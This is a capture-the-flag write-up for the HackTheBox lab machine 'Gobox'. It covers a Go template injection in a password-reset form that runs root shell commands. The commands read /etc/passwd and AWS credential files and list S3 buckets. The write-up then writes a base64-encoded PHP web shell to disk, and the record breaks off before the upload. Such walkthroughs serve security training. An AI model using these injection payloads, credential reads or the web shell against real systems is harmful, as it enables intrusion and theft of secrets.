# Gobox

URL: https://app.hackthebox.com/machines/Gobox

Level: Medium

Date: 29 Sep 2023 - 21 Oct 2023

Note: I don't know precisely why I decided to put this medium box on my "todo list" :) It is still a bit difficult, so I needed to watch official ippsec's walkthrough for this!

https://www.youtube.com/watch?v=sbUqjCPDk2k

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [HTTP](#http)
	- [Fuzzing](#fuzzing)
	- [Go SSTI](#go-ssti)
- [Local enumeration](#local-enumeration)
- [AWS credentials](#aws-credentials)
- [PHP reverse shell](#php-reverse-shell)
- [User flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
- [Root flag](#root-flag)
- [Notes](#notes)





## Reconnaissance

### nmap

```bash
$ sudo nmap -T4 -p- -n 10.10.11.113 -oN 01_nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-27 12:27 CEST
Nmap scan report for 10.10.11.113
Host is up (0.052s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
4566/tcp open     kwtc
8080/tcp open     http-proxy
9000/tcp filtered cslistener
9001/tcp filtered tor-orport
9002/tcp filtered dynamid

Nmap done: 1 IP address (1 host up) scanned in 23.16 seconds
```

It seems we have `nginx` on port 4566/tcp:

```bash
$ nc -nv 10.10.11.113 4566
(UNKNOWN) [10.10.11.113] 4566 (?) open


?
HTTP/1.1 400 Bad Request
Server: nginx
Date: Wed, 27 Sep 2023 10:28:07 GMT
Content-Type: text/html
Content-Length: 150
Connection: close

<html>
<head><title>400 Bad Request</title></head>
<body>
<center><h1>400 Bad Request</h1></center>
<hr><center>nginx</center>
</body>
</html>
```

Same on port 8080/tcp:

```bash
$ nc -nv 10.10.11.113 8080
(UNKNOWN) [10.10.11.113] 8080 (http-alt) open
?
HTTP/1.1 400 Bad Request
Server: nginx
Date: Wed, 27 Sep 2023 10:28:43 GMT
Content-Type: text/html
Content-Length: 150
Connection: close

<html>
<head><title>400 Bad Request</title></head>
<body>
<center><h1>400 Bad Request</h1></center>
<hr><center>nginx</center>
</body>
</html>
```

```bash
$ sudo nmap -T4 -p80,4566,8080 -n 10.10.11.113 -sC -sV -oN 02_nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-27 12:29 CEST
Nmap scan report for 10.10.11.113
Host is up (0.045s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Hacking eSports | {{.Title}}
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: Hacking eSports | Home page

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.54 seconds
```

### http

![](Pasted%20image%2020230927123316.png)

It looks like a website made with Bootstrap

```html
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Hacking eSports | {{.Title}}</title>
  <link href="[//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css](view-source:http://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css)" rel="stylesheet" id="bootstrap-css">
  <link href="[css/main.css](view-source:http://10.10.11.113/css/main.css)" rel="stylesheet">
  <script src="[//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js](view-source:http://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js)"></script>
  <script src="[//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js](view-source:http://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js)"></script>

  <img class="bg" src="[header.png](view-source:http://10.10.11.113/header.png)" />
</head>

<body>
<section class="vh-100" style="background-color:#2e051b;">
  <div class="container py-5 h-100">
    <div class="row d-flex justify-content-center align-items-center h-100">
    <center>
	     <h3 class="text-header">The Next Person to Qualify Will Be Announced Shortly</h3>
  	     <h3 class="text-header" id="end"></h3>
	     <h3 class="text-header">Who will join big0us?</h3>
    </center>
<script>
```

On port 8080/TCP we have a login form:

![](Pasted%20image%2020230927123602.png)

### dirbusting

```bash
joshua@kaligra:~/Documents/htb/gobox$ feroxbuster --silent -u http://10.10.11.113 -t 200 -d 4 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
http://10.10.11.113/
http://10.10.11.113/css => http://10.10.11.113/css/
```

```bash
joshua@kaligra:~/Documents/htb/gobox$ feroxbuster --silent -u http://10.10.11.113:8080 -t 200 -d 4 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
http://10.10.11.113:8080/forgot => http://10.10.11.113:8080/forgot/
http://10.10.11.113:8080/http%3A%2F%2Fwww => http://10.10.11.113:8080/http:/www
http://10.10.11.113:8080/forgot/http%3A%2F%2Fwww => http://10.10.11.113:8080/forgot/http:/www
http://10.10.11.113:8080/http%3A%2F%2Fyoutube => http://10.10.11.113:8080/http:/youtube
http://10.10.11.113:8080/forgot/http%3A%2F%2Fyoutube => http://10.10.11.113:8080/forgot/http:/youtube
http://10.10.11.113:8080/http%3A%2F%2Fblogs => http://10.10.11.113:8080/http:/blogs
http://10.10.11.113:8080/http%3A%2F%2Fblog => http://10.10.11.113:8080/http:/blog
http://10.10.11.113:8080/forgot/http%3A%2F%2Fblogs => http://10.10.11.113:8080/forgot/http:/blogs
http://10.10.11.113:8080/forgot/http%3A%2F%2Fblog => http://10.10.11.113:8080/forgot/http:/blog
http://10.10.11.113:8080/**http%3A%2F%2Fwww => http://10.10.11.113:8080/%2A%2Ahttp:/www
http://10.10.11.113:8080/forgot/**http%3A%2F%2Fwww => http://10.10.11.113:8080/forgot/%2A%2Ahttp:/www
http://10.10.11.113:8080/http%3A%2F%2Fcommunity => http://10.10.11.113:8080/http:/community
http://10.10.11.113:8080/forgot/http%3A%2F%2Fcommunity => http://10.10.11.113:8080/forgot/http:/community
http://10.10.11.113:8080/http%3A%2F%2Fradar => http://10.10.11.113:8080/http:/radar
http://10.10.11.113:8080/forgot/http%3A%2F%2Fradar => http://10.10.11.113:8080/forgot/http:/radar
http://10.10.11.113:8080/http%3A%2F%2Fjeremiahgrossman => http://10.10.11.113:8080/http:/jeremiahgrossman
http://10.10.11.113:8080/http%3A%2F%2Fweblog => http://10.10.11.113:8080/http:/weblog
http://10.10.11.113:8080/http%3A%2F%2Fswik => http://10.10.11.113:8080/http:/swik
http://10.10.11.113:8080/forgot/http%3A%2F%2Fjeremiahgrossman => http://10.10.11.113:8080/forgot/http:/jeremiahgrossman
http://10.10.11.113:8080/forgot/http%3A%2F%2Fweblog => http://10.10.11.113:8080/forgot/http:/weblog
http://10.10.11.113:8080/forgot/http%3A%2F%2Fswik => http://10.10.11.113:8080/forgot/http:/swik

```

Dirbusting on port `4566/tcp`:

```bash
$ ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.113:4566/FUZZ  -fs 146

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.113:4566/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 146
________________________________________________

:: Progress: [220560/220560] :: Job [1/1] :: 901 req/sec :: Duration: [0:04:32] :: Errors: 0 ::
```

We try to reset password for `admin@gobox.htb` and we get a positive result.
Email address is reflected

Golang webserver detected:

```bash
$ curl -v http://10.10.11.113:8080/forgot
*   Trying 10.10.11.113:8080...
* Connected to 10.10.11.113 (10.10.11.113) port 8080 (#0)
> GET /forgot HTTP/1.1
> Host: 10.10.11.113:8080
> User-Agent: curl/7.87.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 301 Moved Permanently
< Server: nginx
< Date: Sat, 21 Oct 2023 08:53:21 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 43
< Connection: keep-alive
< Location: /forgot/
< X-Forwarded-Server: golang <===========
<
<a href="/forgot/">Moved Permanently</a>.

* Connection #0 to host 10.10.11.113 left intact
```

### Fuzzing

Let's focus on "forgot" page and try to fuzz

![](Pasted%20image%2020231021111802.png)

```bash
$ ffuf  -w /opt/SecLists/Fuzzing/special-chars.txt -u http://10.10.11.113:8080/forgot/ -d email=FUZZ
..
..
)                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 47ms]
!                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 52ms]
|                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 53ms]
&                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 53ms]
;                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 55ms]
(                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 54ms]
"                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 55ms]
.                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 62ms]
*                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 63ms]
~                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 63ms]
-                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 67ms]
?                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 68ms]
+                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 57ms]
<                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 59ms]
\                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 59ms]
'                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 55ms]
@                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 68ms]
/                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 68ms]
%                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 68ms]
_                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 58ms]
#                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 69ms]
{                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 69ms]
[                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 69ms]
}                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 69ms]
,                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 70ms]
^                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 70ms]
>                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 56ms]
]                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 58ms]
:                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 57ms]
`                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 70ms]
=                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 70ms]
$                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 71ms]
:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Every request is returning a 1497 Bytes size response.


Let's compare with Repeater's response:

![](Pasted%20image%2020231021112613.png)

![](Pasted%20image%2020231021112639.png)

We are trying to "break" application, so we are looking for a *really* different value in size response.

Anyway, maybe we are missing some important header.

Let's add `Content-Type: application/x-www-form-urlencoded`:

```bash
$ ffuf  -w /opt/SecLists/Fuzzing/special-chars.txt -u http://10.10.11.113:8080/forgot/ -d email=FUZZ -H 'Content-Type: application/x-www-form-urlencoded'
..
..
]                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 46ms]
>                       [Status: 200, Size: 1501, Words: 263, Lines: 51, Duration: 47ms]
!                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 47ms]
~                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 49ms]
#                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 49ms]
@                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 54ms]
|                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 57ms]
'                       [Status: 200, Size: 1502, Words: 263, Lines: 51, Duration: 54ms]
\                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 53ms]
;                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 52ms]
[                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 64ms]
`                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 70ms]
/                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 75ms]
{                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 75ms]
:                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 72ms]
}                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 77ms]
^                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 76ms]
<                       [Status: 200, Size: 1505, Words: 263, Lines: 51, Duration: 77ms]
(                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 78ms]
_                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 78ms]
&                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 77ms]
$                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 82ms]
"                       [Status: 200, Size: 1502, Words: 263, Lines: 51, Duration: 80ms]
%                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 83ms]
+                       [Status: 200, Size: 1498, Words: 264, Lines: 51, Duration: 81ms]
,                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 82ms]
-                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 82ms]
)                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 60ms]
=                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 82ms]
*                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 84ms]
?                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 85ms]
.                       [Status: 200, Size: 1498, Words: 263, Lines: 51, Duration: 85ms]
:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Now we have different results. We can filter out 1498 size:

```bash
$ ffuf  -w /opt/SecLists/Fuzzing/special-chars.txt -u http://10.10.11.113:8080/forgot/ -d email=FUZZ -H 'Content-Type: application/x-www-form-urlencoded' -fs 1498
..
..
<                       [Status: 200, Size: 1505, Words: 263, Lines: 51, Duration: 57ms]
'                       [Status: 200, Size: 1502, Words: 263, Lines: 51, Duration: 61ms]
&                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 64ms]
;                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 65ms]
"                       [Status: 200, Size: 1502, Words: 263, Lines: 51, Duration: 59ms]
>                       [Status: 200, Size: 1501, Words: 263, Lines: 51, Duration: 63ms]
%                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 65ms]
:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

We can also try "double fuzzing":

```bash
$ ffuf  -w /opt/SecLists/Fuzzing/special-chars.txt -u http://10.10.11.113:8080/forgot/ -d email=FUZZFUZZ -H 'Content-Type: application/x-www-form-urlencoded'
..
..
>                       [Status: 200, Size: 1505, Words: 263, Lines: 51, Duration: 46ms]
%                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 47ms]
$                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 49ms]
<                       [Status: 200, Size: 1513, Words: 263, Lines: 51, Duration: 52ms]
=                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 55ms]
}                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 57ms]
!                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 55ms]
#                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 57ms]
?                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 54ms]
\                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 54ms]
,                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 53ms]
`                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 54ms]
.                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 54ms]
|                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 54ms]
@                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 59ms]
~                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 58ms]
-                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 59ms]
+                       [Status: 200, Size: 1499, Words: 265, Lines: 51, Duration: 59ms]
*                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 57ms]
'                       [Status: 200, Size: 1507, Words: 263, Lines: 51, Duration: 60ms]
_                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 57ms]
^                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 59ms]
&                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 60ms]
;                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 61ms]
/                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 60ms]
[                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 60ms]
]                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 60ms]
:                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 62ms]
(                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 60ms]
)                       [Status: 200, Size: 1499, Words: 263, Lines: 51, Duration: 63ms]
"                       [Status: 200, Size: 1507, Words: 263, Lines: 51, Duration: 61ms]
:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Exclude 1499

```bash
>                       [Status: 200, Size: 1505, Words: 263, Lines: 51, Duration: 47ms]
'                       [Status: 200, Size: 1507, Words: 263, Lines: 51, Duration: 47ms]
"                       [Status: 200, Size: 1507, Words: 263, Lines: 51, Duration: 48ms]
<                       [Status: 200, Size: 1513, Words: 263, Lines: 51, Duration: 54ms]
%                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 56ms]
;                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 57ms]
&                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 59ms]
```

Anyway, if we manually do "double fuzzing" with Burpsuite, we get a very different response:

![](Pasted%20image%2020231021113539.png)

![](Pasted%20image%2020231021113606.png)

The issue here is that `ffuf` is NOT matching 502 response code!

![](Pasted%20image%2020231021113654.png)

Let's add a different option (`-mc all`):

```bash
$ ffuf  -w /opt/SecLists/Fuzzing/special-chars.txt -u http://10.10.11.113:8080/forgot/ -d email=FUZZFUZZ -H 'Content-Type: application/x-www-form-urlencoded' -fs 1499 -mc all
..
..
>                       [Status: 200, Size: 1505, Words: 263, Lines: 51, Duration: 52ms]
%                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 51ms]
&                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 53ms]
;                       [Status: 200, Size: 1497, Words: 263, Lines: 51, Duration: 56ms]
<                       [Status: 200, Size: 1513, Words: 263, Lines: 51, Duration: 57ms]
"                       [Status: 200, Size: 1507, Words: 263, Lines: 51, Duration: 57ms]
'                       [Status: 200, Size: 1507, Words: 263, Lines: 51, Duration: 57ms]
{                       [Status: 502, Size: 150, Words: 5, Lines: 8, Duration: 60ms]
```

### GO SSTI

Let's try some payload, ref.

http://blog.takemyhand.xyz/2020/06/ssti-breaking-gos-template-engine-to

![](Pasted%20image%2020231021114815.png)

![](Pasted%20image%2020231021114831.png)

![](Pasted%20image%2020231021114847.png)


We get a GO source code page?

![](Pasted%20image%2020231021115144.png)


If we look closely, we noticed a function `DebugCmd`:

```go
func (u User) DebugCmd (test string) string {
  ipp := strings.Split(test, " ")
  bin := strings.Join(ipp[:1], " ")
  args := strings.Join(ipp[1:], " ")
  if len(args) > 0{
    out, _ := exec.Command(bin, args).CombinedOutput()
    return string(out)
  } else {
    out, _ := exec.Command(bin).CombinedOutput()
    return string(out)
  }
}
```

Let's try to pass `id` command:

![](Pasted%20image%2020231021115515.png)

![](Pasted%20image%2020231021115526.png)

Same as

```bash
$ curl -X POST -H 'Host: 10.10.11.113:8080' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.113:8080/forgot/ --data-binary 'email={{.DebugCmd "id"}}'
..
..
Email Sent To: uid=0(root) gid=0(root) groups=0(root)
..
..
```


```http
email={{.DebugCmd "ls /"}}
```

response:

```http
             Email Sent To: bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

## Local enumeration

```http
email={{.DebugCmd "cat /etc/passwd"}}
```

```http
Email Sent To: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
```

Let's interact with `cURL`:

```bash
$ curl -s -X POST -H 'Host: 10.10.11.113:8080' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.113:8080/forgot/ --data-binary 'email={{.DebugCmd "pwd"}}' |grep "Email Sent"
              Email Sent To: /opt/uhc
```

It looks like `/root` is empty:

```bash
$ curl -s -X POST -H 'Host: 10.10.11.113:8080' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.113:8080/forgot/ --data-binary 'email={{.DebugCmd "ls -l /root"}}'  |grep "Email Sent"
              Email Sent To: total 0
```

Let's hunt for hidden files/directories:

```bash
$ curl -s -X POST -H 'Host: 10.10.11.113:8080' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.113:8080/forgot/ --data-binary 'email={{.DebugCmd "ls -la /root"}}'  | grep -A20 "Email Sent"
              Email Sent To: total 24
drwx------ 1 root root 4096 Aug 26  2021 .
drwxr-xr-x 1 root root 4096 Aug 24  2021 ..
drwxr-xr-x 2 root root 4096 Aug 24  2021 .aws
-rw------- 1 root root  104 Aug 26  2021 .bash_history
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile


              <button class="btn btn-primary btn-lg btn-block" type="submit">Login</button>
            </form>
              </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</section>
```

```bash
$ curl -s -X POST -H 'Host: 10.10.11.113:8080' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.113:8080/forgot/ --data-binary 'email={{.DebugCmd "ls -la /root/.aws"}}'  | grep -A20 "Email Sent"
              Email Sent To: total 12
drwxr-xr-x 2 root root 4096 Aug 24  2021 .
drwx------ 1 root root 4096 Aug 26  2021 ..
-rw-r--r-- 1 root root  260 Aug 24  2021 credentials
..
..
```

## AWS credentials

We found AWS credentials

```bash
$ curl -s -X POST -H 'Host: 10.10.11.113:8080' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.113:8080/forgot/ --data-binary 'email={{.DebugCmd "cat /root/.aws/credentials"}}'   |grep -A20 "Email Sent"
              Email Sent To: [default]
aws_access_key_id=SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
aws_secret_access_key=SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
..
..
```



They are also present in our environment variables:

```bash
$ curl -s -X POST -H 'Host: 10.10.11.113:8080' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.113:8080/forgot/ --data-binary 'email={{.DebugCmd "env"}}'   |grep -A20 "Email Sent"
              Email Sent To: HOSTNAME=aws
PWD=/opt/uhc
HOME=/root
AWS_SECRET_ACCESS_KEY=SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
SHLVL=0
AWS_ACCESS_KEY_ID=SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DEBIAN_FRONTEND=noninteractive
OLDPWD=/
_=/usr/bin/env
..
..
```

Let's try some aws enumeration technique, ref.

https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-s3-athena-and-glacier-enum

```bash
$ curl -s -X POST -H 'Host: 10.10.11.113:8080' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.113:8080/forgot/ --data-binary 'email={{.DebugCmd "aws s3 ls"}}'   |grep -A20 "Email Sent"
              Email Sent To: 2023-10-21 08:25:11 website
```

It looks we have an S3 bucket called `website`.

```bash
$ curl -s -X POST -H 'Host: 10.10.11.113:8080' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.113:8080/forgot/ --data-binary 'email={{.DebugCmd "aws s3 ls s3://website"}}'   |grep -A20 "Email Sent"
              Email Sent To:                            PRE css/
2023-10-21 08:25:11    1294778 bottom.png
2023-10-21 08:25:11     165551 header.png
2023-10-21 08:25:11          5 index.html
2023-10-21 08:25:11       1803 index.php
```

Our goal is now to upload some PHP reverse shell to that s3 bucket.

We need to create **locally** a PHP file, and then copy to s3.

## PHP reverse shell

```bash
$ echo -n "<?php system($_GET['cmd']);?>"
<?php system(['cmd']);?>
```

We need to escape "$"

```bash
$ echo -n "<?php system(\$_GET['cmd']);?>"
<?php system($_GET['cmd']);?>
```

Since we are going to do this through cURL, we need to rid off most of special chars, so we encode our string with base64:

```bash
$ echo -n "<?php system(\$_GET['cmd']);?>"  | base64
PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

```bash
curl -s -X POST -H 'Host: 10.10.11.113:8080' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.113:8080/forgot/ --data-binary 'email={{.DebugCmd "echo -n PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4= | base64 -d > /tmp/shell"}}'
```

It worked?

```bash
$ curl -s -X POST -H 'Host: 10.10.11.113:8080' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.113:8080/forgot/ --data-binary 'email={{.DebugCmd "cat /tmp/shell"}}' |grep "Email Sent"
              Email Sent To: &amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]);?&amp;gt;
```

Let's trying coping our file to bucket...

```bash
